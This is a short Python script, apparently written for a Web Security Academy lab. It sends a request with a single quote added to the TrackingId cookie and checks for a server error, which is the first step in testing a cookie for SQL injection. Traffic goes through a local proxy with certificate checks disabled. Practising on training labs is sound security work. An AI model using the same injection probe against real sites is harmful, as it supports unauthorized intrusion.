#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {"Host": "ac2a1fc41f7b9f30c0288f06007700b0.web-security-academy.net",
"Cookie": "TrackingId=tJBcJEogHX20zKzn'; session=LPTE4K9tEV8b1xyeEBqLcH4loQfboIjt"}

url = "https://ac2a1fc41f7b9f30c0288f06007700b0.web-security-academy.net"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)

for x in r.text.split("\n"):
    if "Internal Server Error" in x:
        print("[+] Internal Server Error!")
        exit()